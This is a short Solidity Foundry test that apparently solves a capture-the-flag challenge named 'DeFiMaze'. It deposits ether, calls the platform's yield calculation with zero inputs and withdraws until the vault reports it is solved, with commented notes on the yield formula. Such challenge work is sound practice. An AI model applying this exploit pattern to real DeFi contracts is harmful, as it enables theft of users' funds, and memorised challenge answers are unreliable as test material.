// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console2} from "forge-std/Test.sol";
import {DeFiPlatform} from "DefiMaze/contracts/DeFiPlatform.sol";
import {Vault} from "DefiMaze/contracts/Vault.sol";
import {SetUp} from "DefiMaze/contracts/SetUp.sol";

contract DeFiMazeTest is Test {
    DeFiPlatform public platform;
    Vault public vault;
    SetUp public set;
    address public player = address(42);
    uint public constant RATIO = 10**18;

    function setUp() public {
        vm.prank(player);
        set = new SetUp();
        vault = set.vault();
        platform = set.platfrom();
    }

    function test_DeFiMazeSolution() public {
        uint principal;
        uint rate;
        uint time;
        // uint r = rate / 100 + RATIO;
        // uint t = (2**128) ** (time * 2**64);
        // uint yieldAmount = principal * r * (t - RATIO) / RATIO**2;
        // yieldAmount = principal * (rate / 100 + RATIO) * ((2**128) ** (time * 2**64) - RATIO) / RATIO**2;
        // yieldAmount = principal * (rate / (RATIO * 100) + 1) *  ((2**128) ** (time * 2**64) / RATIO - 1);
        platform.depositFunds{value: 7 ether}(7 ether);
        uint x = platform.calculateYield(0, 0, 0);
        platform.requestWithdrawal(7 ether);
        vault.isSolved();
        assertTrue(vault.solved());
    }
}
